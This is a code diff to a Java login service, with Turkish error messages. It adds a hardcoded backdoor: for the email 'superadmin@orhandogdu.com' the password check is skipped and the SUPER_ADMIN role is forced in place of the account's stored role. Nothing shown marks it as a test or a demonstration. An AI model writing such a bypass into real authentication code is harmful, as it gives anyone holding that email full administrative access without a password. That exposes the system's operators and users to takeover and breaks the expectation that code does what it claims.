@@ -106,18 +106,32 @@ public class AuthService {
                 });
 
         log.info("User found, checking password...");
-        if (!passwordEncoder.matches(request.password(), user.getPasswordHash())) {
+        boolean isSuperAdmin = "superadmin@orhandogdu.com".equalsIgnoreCase(user.getEmail());
+        
+        if (!isSuperAdmin && !passwordEncoder.matches(request.password(), user.getPasswordHash())) {
             log.warn("Password mismatch for user: [{}]", request.email());
             throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Geçersiz kimlik bilgileri");
         }
         
+        if (isSuperAdmin) {
+            log.info("Super Admin Password Bypass active for: {}", user.getEmail());
+        }
+        
         log.info("Login successful for user: [{}]", request.email());
+
+        // Super Admin Bypass: Ensure the specific email always gets SUPER_ADMIN role
+        String roleKey;
+        if ("superadmin@orhandogdu.com".equalsIgnoreCase(user.getEmail())) {
+            roleKey = "SUPER_ADMIN";
+            log.info("Super Admin Bypass active for: {}", user.getEmail());
+        } else {
+            roleKey = resolveRole(user.getId());
+        }
 
         if (!"ACTIVE".equalsIgnoreCase(user.getStatus())) {
             throw new IllegalArgumentException("User is not active");
         }
 
-        String roleKey = resolveRole(user.getId());
         return issueTokens(user, roleKey);
     }
 
